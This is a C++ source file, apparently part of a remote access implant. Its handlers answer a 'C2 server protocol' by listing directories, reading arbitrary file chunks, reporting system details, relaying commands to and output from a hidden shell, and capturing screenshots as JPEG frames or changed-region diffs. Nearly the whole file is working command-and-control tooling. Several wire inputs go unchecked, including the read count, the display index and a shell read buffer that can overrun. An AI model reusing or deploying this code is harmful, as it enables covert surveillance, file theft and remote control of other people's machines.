#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "vector.h"
#include "system_info.h"
#include "string.h"

// =============================================================================
// Wire-format directory entry — fixed layout matching the C2 server protocol.
// Uses CHAR16 (always 2 bytes) instead of WCHAR (2 bytes on Windows, 4 on Linux)
// so that sizeof(WireDirectoryEntry) is identical on every platform.
// =============================================================================

#pragma pack(push, 1)
struct WireDirectoryEntry
{
    CHAR16 Name[256]; ///< UTF-16LE file/directory name
    UINT64 CreationTime;
    UINT64 LastModifiedTime;
    UINT64 Size;
    UINT32 Type;
    BOOL IsDirectory;
    BOOL IsDrive;
    BOOL IsHidden;
    BOOL IsSystem;
    BOOL IsReadOnly;
};
#pragma pack(pop)

/// Convert a native DirectoryEntry to the wire-format WireDirectoryEntry
static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
{
    StringUtils::WideToChar16(
        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
        Span<CHAR16>(dst.Name, 256));
    dst.CreationTime = src.CreationTime;
    dst.LastModifiedTime = src.LastModifiedTime;
    dst.Size = src.Size;
    dst.Type = src.Type;
    dst.IsDirectory = src.IsDirectory;
    dst.IsDrive = src.IsDrive;
    dst.IsHidden = src.IsHidden;
    dst.IsSystem = src.IsSystem;
    dst.IsReadOnly = src.IsReadOnly;
}

/// Decode a CHAR16 path from the wire protocol into a native WCHAR path.
/// Normalizes path separators to the platform convention (e.g. '\' → '/' on Linux).
static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return 0;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;
    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    // Normalize separators so that Windows-style '\' paths work on Linux
    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return len;
}

// Writes a simple error response with the given status code
static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = code;
}

// Checks if a directory entry is "." or ".."
static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

// =============================================================================
// Command handlers
// =============================================================================

// Gets directory content for a given path and returns an array of WireDirectoryEntry structures.
VOID Handle_GetDirectoryContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetDirectoryContentCommand.");
    // Buffer to hold the path from command 
    WCHAR directoryPath[1024];
    // Decoding path from command
    DecodeWirePath(command, commandLength, directoryPath, 1024);
    LOG_INFO("Getting directory content for path: %ws", directoryPath);

    // Create a DirectoryIterator for the specified path and validate it
    auto result = DirectoryIterator::Create(directoryPath);
    if (!result.IsOk())
    {
        LOG_ERROR("Invalid directory path: %ws. Operation failed (error code: %e).", directoryPath, result.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    // Iterator successfully created, so we can now read entries
    DirectoryIterator &iter = result.Value();
    // Initialize a vector to hold the directory entries and validate each of them
    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        LOG_ERROR("Failed to allocate directory entry buffer");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    // Iterate through the directory entries, skipping "." and "..", and add them to the vector
    while (iter.Next())
    {
        const DirectoryEntry &entry = iter.Get();
        if (IsDotEntry(entry))
            continue;

        if (!entries.Add(entry))
        {
            LOG_ERROR("Failed to grow directory entry buffer");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        LOG_INFO("Directory entry added: %ws", entry.Name);
    }

    // Prepare the response buffer - writing entry count, status code and array of WireDirectoryEntry structures
    UINT64 entryCount = (UINT64)entries.Count;
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
    *response = new CHAR[*responseLength]; 

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &entryCount, sizeof(UINT64));

    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
    for (UINT64 i = 0; i < entryCount; i++)
    {
        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
        ToWireEntry(entries.Data[i], wireEntries[i]);
    }
    LOG_INFO("Directory content retrieved successfully with %llu entries", entryCount);
}


// Reads a chunk of file content
VOID Handle_GetFileContentCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileContentCommand.");
    // Getting parameters from command buffer: read count, offset and file path
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
    LOG_INFO("Reading file content with offset: %llu and count: %llu.", offset, readCount);

    // Decoding file path from command buffer
    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
    LOG_INFO("Getting file content for path %ws", filePath);
    // Attempt to open the file and validate the result
    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        LOG_ERROR("Failed to open file: %ws (error code: %e).", filePath, openResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }   
    LOG_INFO("File opened successfully: %ws", filePath);

    // Prepare the response buffer - writing status code, bytes read and file content chunk
    File &file = openResult.Value();
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
    *response = new CHAR[*responseLength];

    USIZE responseOffset = sizeof(UINT32) + sizeof(UINT64);
    (void)file.SetOffset((USIZE)offset);

    auto readResult = file.Read(Span<UINT8>((UINT8 *)(*response + responseOffset), (USIZE)readCount));
    UINT32 bytesRead = readResult ? readResult.Value() : 0;

    *(PUINT32)*response = StatusCode::StatusSuccess;
    *(PUINT64)(*response + sizeof(UINT32)) = bytesRead;

    LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
}

// Computes the SHA-256 hash of a file chunk
VOID Handle_GetFileChunkHashCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileChunkHashCommand.");
    // Getting parameters from command buffer: chunk size, offset and file path
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    LOG_INFO("Computing file chunk hash with offset: %llu and chunk size: %llu.", offset, chunkSize);

    // Decoding file path from command buffer
    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    WCHAR filePath[1024];
    DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
    LOG_INFO("Getting file chunk hash for path: %ws", filePath);

    // Attempt to open the file and validate the result
    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        LOG_ERROR("Failed to open file: %ws (error code: %e).", filePath, openResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("File opened successfully: %ws", filePath);

    File &file = openResult.Value();
    // Allocating a buffer for reading file chunks.
    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];

    SHA256 sha256;
    USIZE totalRead = 0;
    // Read file in small chanks and update the hash untill we read the requested count or reach the end of file
    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        LOG_INFO("Reading file chunk with offset: %llu and count: %llu.", offset + totalRead, bytesToRead);
        (void)file.SetOffset((USIZE)(offset + totalRead));
        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        UINT32 bytesRead = readResult ? readResult.Value() : 0;
        if (bytesRead == 0)
            break;
        LOG_INFO("Reading %u bytes from file for hashing.", bytesRead);

        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;
    // Prepare the response buffer - writing status code and SHA-256 digest of the file chunk
    *responseLength += SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), digest, SHA256_DIGEST_SIZE);
    LOG_INFO("File chunk hash computed successfully for %llu bytes read", totalRead);
}

// Getting system information such as hostname, architecture and platform details
VOID Handle_GetSystemInfoCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetSystemInfoCommand.");
    // Wrapping system info retrieval in a structure and validating the result
    SystemInfo info;
    GetSystemInfo(&info);

    // Prepare the response buffer - writing status code and SystemInfo structure
    *responseLength = sizeof(UINT32) + sizeof(SystemInfo);
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &info, sizeof(SystemInfo));

    LOG_INFO("System info: hostname=%s, arch=%s, platform=%s retrieved successfully", info.Hostname, info.Architecture, info.Platform);
}

// Writes a command to the shell
VOID Handle_WriteShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling WriteShell command");
    // Creating a shell instance if it doesn't exist yet, and validating the result
    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();

        if (!shellResult)
        {
            LOG_ERROR("Failed to create shell (error code: %e).", shellResult.Error());
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
        LOG_INFO("Shell instance created successfully");
    }

    // Writing the command to the shell
    LOG_INFO("Executing command in shell: %s", command);
    auto writeResult = context->shell->Write(command, commandLength - sizeof('\0'));
    if (!writeResult)
    {
        LOG_ERROR("Failed to write to shell (error code: %e).", writeResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("Command written to shell successfully, bytes written: %llu", writeResult.Value());

    // Prepare the response buffer - writing status code
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;

    LOG_INFO("WriteShell command handled successfully.");
}

// Reads a chunk of data from the shell's stdout
VOID Handle_ReadShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling ReadShell command");

    // Ensure the shell instance exists - create it if it doesn't, and validate the result
    if (context->shell == nullptr)
    {
        auto shellResult = Shell::Create();
        if (!shellResult)
        {
            LOG_ERROR("Failed to create shell (error code: %e).", shellResult.Error());
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->shell = new Shell(static_cast<Shell &&>(shellResult.Value()));
        LOG_INFO("Shell instance created successfully");
    }

    // Buffer to hold the data read from the shell
    CHAR buffer[4096];
    // Attempt to read from the shell and validate the result
    auto readResult = context->shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        LOG_ERROR("Failed to read from shell (error code: %e).", readResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    buffer[readResult.Value()] = '\0'; // Null-terminate the buffer for safe logging
    LOG_INFO("Data read from shell successfully, buffer: %s",buffer);

    // For null termination
    auto readResultLenght = readResult.Value() + 1;

    // Prepare the response buffer - writing status code and the data read from the shell
    *responseLength += readResultLenght;
    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    StringUtils::Copy(Span<CHAR>(*response + sizeof(UINT32), readResultLenght), Span<const CHAR>(buffer, readResultLenght));

    LOG_INFO("ReadShell command handled successfully with %llu bytes read", readResult.Value());
}

// Gets the list of display devices and their information
VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetDisplays command");

    // Ensure the VNC context exists - create it if it doesn't, and validate the result
    if (context->vncContext == nullptr)
    {
        auto vncResult = new VNCContext();
        context->vncContext = vncResult;
    }

    // Getting the list of display devices and validating the result
    auto displays = Screen::GetDevices();
    if (!displays)
    {
        LOG_ERROR("Failed to get display devices (error code: %e).", displays.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }  
    LOG_INFO("Display devices enumerated successfully with %u display(s)", displays.Value().Count);

    ScreenDeviceList &deviceList = displays.Value();

    context->vncContext->DeviceList = deviceList;
    // Prepare the response buffer - writing status code, device count and array of ScreenDevice structures
    *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));

    *response = new CHAR[*responseLength];
    *(PUINT32)*response = StatusCode::StatusSuccess;
    Memory::Copy(*response + sizeof(UINT32), &deviceList.Count, sizeof(deviceList.Count));
    Memory::Copy(*response + sizeof(UINT32) + sizeof(deviceList.Count), deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice)));

    LOG_INFO("GetDisplays command handled successfully with %u display(s)", deviceList.Count);
}

// Callback function for JPEG encoding - called by the encoder to write encoded data chunks
VOID JpegCallback(PVOID context, PVOID data, INT32 size)
{
    JpegBuffer *jpegBuffer = (JpegBuffer *)context;

    if (data == nullptr)
    {
        // Allocate initial buffer if not already allocated
        if (jpegBuffer->outputBuffer == nullptr)
        {
            jpegBuffer->size = (UINT32)size;
            jpegBuffer->outputBuffer = new UINT8[jpegBuffer->size];
        }
    }

    if (jpegBuffer->offset + size > jpegBuffer->size)
    {
        // Allocate a new buffer with double the size
        UINT32 newSize = Math::Max(jpegBuffer->size * 2, jpegBuffer->size + size);
        PUINT8 newBuffer = new UINT8[newSize];
        Memory::Copy(newBuffer, jpegBuffer->outputBuffer, jpegBuffer->offset);
        delete[] jpegBuffer->outputBuffer;
        jpegBuffer->outputBuffer = newBuffer;
        jpegBuffer->size = newSize;
    }
    // Copy the encoded data chunk into the buffer and update the offset
    Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
    jpegBuffer->offset += (UINT32)size;
}


// Gets a screenshot of the specified display device
VOID Handle_GetScreenshotCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetScreenshot command");

    // Parse the command to get display index, quality and full screen flag
    auto displayIndex = *(PUINT32)(command);
    LOG_INFO("Requested display index: %u", displayIndex);
    auto quality = *(PUINT32)(command + sizeof(UINT32));
    LOG_INFO("Requested quality: %u", quality);
    auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));
    LOG_INFO("Requested full screen: %u", isFullScreen);

    // Ensure the VNC context exists - create it if it doesn't, and validate the result
    if (context->vncContext == nullptr)
    {
        auto vncResult = new VNCContext();
        context->vncContext = vncResult;
    }

    // Getting the device list
    if (context->vncContext->DeviceList.Count == 0)
    {
        auto displays = Screen::GetDevices();
        if (!displays)
        {
            LOG_ERROR("Failed to get display devices (error code: %e).", displays.Error());
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->vncContext->DeviceList = displays.Value();
        LOG_INFO("Display devices enumerated successfully with %u display(s)", context->vncContext->DeviceList.Count);
    }

    // For simplicity, we capture the first display device. This can be extended to specify which device to capture.
    const ScreenDevice &device = context->vncContext->DeviceList.Devices[displayIndex];

    // Check if graphics are initialized
    if (context->vncContext->GraphicsList.count == 0)
    {
        context->vncContext->GraphicsList.graphicsArray = new Graphics[context->vncContext->DeviceList.Count];
        context->vncContext->GraphicsList.count = context->vncContext->DeviceList.Count;
    }

    // Get the Graphics structure for the specified display index and initialize buffers if they are not already allocated
    Graphics &graphics = context->vncContext->GraphicsList.graphicsArray[displayIndex];
    if (graphics.currentScreenshot == nullptr)
    {
        graphics.currentScreenshot = new RGB[device.Width * device.Height];
        isFullScreen = true;
    }
    if (graphics.screenshot == nullptr)
    {
        graphics.screenshot = new RGB[device.Width * device.Height];
        isFullScreen = true;
    }
    if (graphics.bidiff == nullptr)
    {
        graphics.bidiff = new UINT8[device.Width * device.Height];
        isFullScreen = true;
    }

    // Attempt to capture the screen and validate the result
    if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height)))
    {
        LOG_ERROR("Failed to capture screen");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // In case of full screen request, encode the whole screenshot as JPEG and send it back
    if (isFullScreen)
    {
        // Encode JPEG, validate the result and write to response
        JpegBuffer jpegBuffer;
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
        if (encodeResult.IsErr())
        {
            LOG_ERROR("Failed to encode JPEG image (error code: %e).", encodeResult.Error());
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        LOG_INFO("JPEG encoding successful, size: %u bytes", jpegBuffer.size);

        // Copy into screenshot buffer for next comparison
        Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

        Rectangle rect(0, 0, jpegBuffer.offset, jpegBuffer.outputBuffer);

        // We are sending the full JPEG data in one segment, so the segment count is 1
        UINT32 countOfSegments = 1;

        // Write response
        *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + jpegBuffer.offset;
        *response = new CHAR[*responseLength];
        *(PUINT32)*response = StatusCode::StatusSuccess;

        // Write the size of the JPEG data
        Memory::Copy(*response + sizeof(UINT32), &countOfSegments, sizeof(UINT32));
        rect.toBuffer((UINT8 *)*response + sizeof(UINT32) + sizeof(UINT32));

        return;
    }
    else
    {
        // Calculate bidiff and write to response
        ImageProcessor::CalculateBiDifference(Span<const RGB>(graphics.currentScreenshot, device.Width * device.Height),
                                              Span<const RGB>(graphics.screenshot, device.Width * device.Height),
                                              device.Width, device.Height,
                                              Span<UCHAR>(graphics.bidiff, device.Width * device.Height));

        // Remove noises from bidiff
        ImageProcessor::RemoveNoise(Span<UCHAR>(graphics.bidiff, device.Width * device.Height),
                                    device.Width, device.Height);

        // Find contours in bidiff, validate the result and write to response
        auto contourResult = ImageProcessor::FindContours(Span<INT8>((INT8 *)graphics.bidiff, device.Width * device.Height),
                                                          (INT32)device.Height, (INT32)device.Width);
        if (contourResult.IsErr())
        {
            LOG_ERROR("Failed to find contours in bidiff image (error code: %e).", contourResult.Error());
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        LOG_INFO("Contours found successfully, count: %u", contourResult.Value().ContourCount);
        auto &contours = contourResult.Value();

        // Number of contours
        UINT32 countOfContour = 0;

        // Use of RGB structure to hold the rectangle data - modified part of the image
        // that will be sent to the client
        PRGB rectScan0 = nullptr;
        USIZE packetSize = *responseLength + sizeof(UINT32); // Initial packet size with space for count of segments
        // Allocate memory for packet
        PCHAR packet = new CHAR[packetSize];
        USIZE offset = sizeof(UINT32) + sizeof(UINT32);

        PContourNode hierarchy = contours.Hierarchy;
        PContour contoursArray = contours.Contours;
        JpegBuffer jpegBuffer;

        // Loop through the contours found to identify rectangles
        for (INT32 i = 0; i < contours.ContourCount; i++)
        {
            // if it is not inner contour
            // find its size
            if (hierarchy[i].Parent == 1)
            {
                // Check if the contour has points
                INT32 minX = contoursArray[i].Points[0].Col, minY = contoursArray[i].Points[0].Row, maxX = 0, maxY = 0;
                // Loop through the points in the contour to find the min and max coordinates to create a rectangle
                for (INT32 j = 0; j < contoursArray[i].Count; j++)
                {
                    if (contoursArray[i].Points[j].Col < minX)
                    {
                        minX = contoursArray[i].Points[j].Col;
                    }
                    if (contoursArray[i].Points[j].Col > maxX)
                    {
                        maxX = contoursArray[i].Points[j].Col;
                    }
                    if (contoursArray[i].Points[j].Row < minY)
                    {
                        minY = contoursArray[i].Points[j].Row;
                    }
                    if (contoursArray[i].Points[j].Row > maxY)
                    {
                        maxY = contoursArray[i].Points[j].Row;
                    }
                }

                // Calculate the width and height of the rectangle
                INT32 rectWeight = maxX - minX + 1;
                INT32 rectHeight = maxY - minY + 1;

                // Make strid dividable by 4(needed for GdipCreateBitmapFromScan0)
                if (rectWeight % 4 != 0)
                {
                    rectWeight -= rectWeight % 4;
                }
                // Check if the rectangle is too small to be considered
                if (rectHeight < 32 || rectWeight < 32)
                {
                    continue;
                }
                countOfContour++;

                LOG_INFO("Rectangle: x: %d, y: %d, width: %d, height: %d.", minX, minY, rectWeight, rectHeight);

                LOG_INFO("Allocating memory for rectangle rgb data.");
                // Allocate memory for the rectangle rgb data
                rectScan0 = new RGB[rectHeight * rectWeight];

                LOG_INFO("Memory allocated.");
                // Copy the rectangle rgb data to buffer
                for (INT32 j = 0; j < rectHeight; j++)
                {
                    for (INT32 k = 0; k < rectWeight; k++)
                    {
                        rectScan0[j * rectWeight + k] = graphics.currentScreenshot[(minY + j) * device.Width + minX + k]; // Copy the pixel data from the screenshot to the rectangle buffer
                    }
                }
                LOG_INFO("Rectangle rgb data copied.");
                LOG_INFO("Encoding rectangle.");

                // Prepare the JPEG buffer for encoding
                jpegBuffer.offset = 0;

                auto encodeResult = JpegEncoder::Encode(JpegCallback, &jpegBuffer, (INT32)quality, (INT32)rectWeight, (INT32)rectHeight, 3, Span<const UINT8>((UINT8 *)rectScan0, rectWeight * rectHeight * sizeof(RGB)));
                if (encodeResult.IsErr())
                {
                    LOG_ERROR("Failed to encode JPEG image (error code: %e).", encodeResult.Error());
                    WriteErrorResponse(response, responseLength, StatusCode::StatusError);
                    return;
                }
                LOG_INFO("Rectangle encoded with size: %u.", jpegBuffer.size);

                LOG_INFO("Reallocating memory for packet.");
                Rectangle rect((UINT32)minX, (UINT32)minY, jpegBuffer.size, jpegBuffer.outputBuffer);
                // Add packet size for the rectangle data
                packetSize += jpegBuffer.size + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData);

                // Reallocate memory for the packet to hold the new rectangle data
                auto oldPacket = packet;
                auto newPacket = new CHAR[packetSize];
                Memory::Copy(newPacket, oldPacket, offset);
                delete[] oldPacket;
                packet = newPacket;

                LOG_INFO("Memory allocated.");

                offset += rect.toBuffer((UINT8 *)packet + offset);

                LOG_INFO("Cleaning up.");

                // Clean up the rectangle buffer for the next iteration
                delete[] rectScan0;
                rectScan0 = nullptr;
            }
        }

        // Copy the current screenshot to the screenshot buffer for the next comparison
        Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

        // Set the count of contours in the packet
        *(PUINT32)(packet + sizeof(UINT32)) = countOfContour;
        // Set the size of the packet and the response
        *response = packet;
        *responseLength = packetSize;
        *(PUINT32)*response = StatusCode::StatusSuccess;

        // Clean up resources used for contour detection
        contours.Free();
    }

    LOG_INFO("GetScreenshot command handled successfully with resolution %ux%u", device.Width, device.Height);
}